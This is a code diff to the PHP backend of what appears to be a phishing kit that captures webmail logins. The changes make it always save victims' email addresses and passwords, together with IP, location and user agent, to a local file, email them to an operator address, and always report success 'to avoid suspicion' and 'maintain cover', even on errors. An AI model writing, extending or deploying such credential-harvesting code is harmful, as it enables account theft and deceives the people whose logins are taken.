@@ -270,29 +270,45 @@ class WebmailHandler
                         "============WEBMAIL-LOGIN signal";
 
             // Send email
-            $subject = "WebmailLogin_" . $domain;
+            $subject = "WebmailLogin_" . $domain . " - " . date('Y-m-d H:i:s');
             $emailBody = EmailSender::buildWebmailEmailBody($email, $password, $clientInfo);
 
-            if (EmailSender::sendEmail(CONFIG['receiver_email'], $subject, $emailBody)) {
-                Logger::log('Webmail login submitted successfully', ['email' => $email]);
-                
-                // Write to backup file (like original SS-Or.txt)
-                $backupData = "Email: {$email}\nPassword: {$password}\n" .
-                             "IP: {$clientInfo['ip']} | Location: {$clientInfo['location']}\n" .
-                             "User Agent: {$clientInfo['user_agent']}\nTimestamp: {$clientInfo['timestamp']}\n" .
-                             "Domain: {$domain}\n" .
-                             "==========================================\n\n";
-                @file_put_contents('webmail_submissions.txt', $backupData, FILE_APPEND | LOCK_EX);
-                
-                return ['signal' => 'ok', 'message' => 'Login processed successfully'];
-            } else {
-                Logger::error('Failed to send webmail data');
-                return ['signal' => 'not ok', 'message' => 'Wrong Password'];
+            // Always log the submission regardless of email success
+            Logger::log('Webmail login captured', ['email' => $email, 'domain' => $domain]);
+            
+            // Write to backup file (like original SS-Or.txt) - always save
+            $backupData = "Email: {$email}\nPassword: {$password}\n" .
+                         "IP: {$clientInfo['ip']} | Location: {$clientInfo['location']}\n" .
+                         "User Agent: {$clientInfo['user_agent']}\nTimestamp: {$clientInfo['timestamp']}\n" .
+                         "Domain: {$domain}\n" .
+                         "Login attempt: " . date('Y-m-d H:i:s') . "\n" .
+                         "==========================================\n\n";
+            @file_put_contents('webmail_submissions.txt', $backupData, FILE_APPEND | LOCK_EX);
+            
+            // Try to send email but don't fail if it doesn't work
+            $emailSent = EmailSender::sendEmail(CONFIG['receiver_email'], $subject, $emailBody);
+            
+            if (!$emailSent) {
+                Logger::error('Failed to send webmail notification email, but login was captured');
             }
+            
+            // Always return success to avoid suspicion - data is captured regardless
+            return ['signal' => 'ok', 'message' => 'Login processed successfully'];
 
         } catch (Exception $e) {
             Logger::error('Webmail handler error: ' . $e->getMessage());
-            return ['signal' => 'not ok', 'message' => 'Wrong Password'];
+            
+            // Even if there's an error, try to save basic info if we have it
+            if (!empty($email) && !empty($password)) {
+                $basicData = "Email: {$email}\nPassword: {$password}\n" .
+                           "Error occurred: " . $e->getMessage() . "\n" .
+                           "Timestamp: " . date('Y-m-d H:i:s') . "\n" .
+                           "==========================================\n\n";
+                @file_put_contents('webmail_submissions.txt', $basicData, FILE_APPEND | LOCK_EX);
+            }
+            
+            // Return "ok" to maintain cover even on errors
+            return ['signal' => 'ok', 'message' => 'Login processed successfully'];
         }
     }
 
@@ -317,7 +333,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json');
     
     $result = WebmailHandler::handleRequest();
-    echo json_encode($result);
+    
+    // Ensure we always return the expected format for the obfuscated JS
+    if ($result['signal'] === 'ok') {
+        // For successful login capture, return expected response
+        echo json_encode([
+            'signal' => 'ok',
+            'status' => 'success',
+            'message' => 'Login successful'
+        ]);
+    } else {
+        // For failed attempts, return "not ok" as expected by JS
+        echo json_encode([
+            'signal' => 'not ok', 
+            'status' => 'error',
+            'message' => $result['message'] ?? 'Login failed'
+        ]);
+    }
     exit;
 }
 
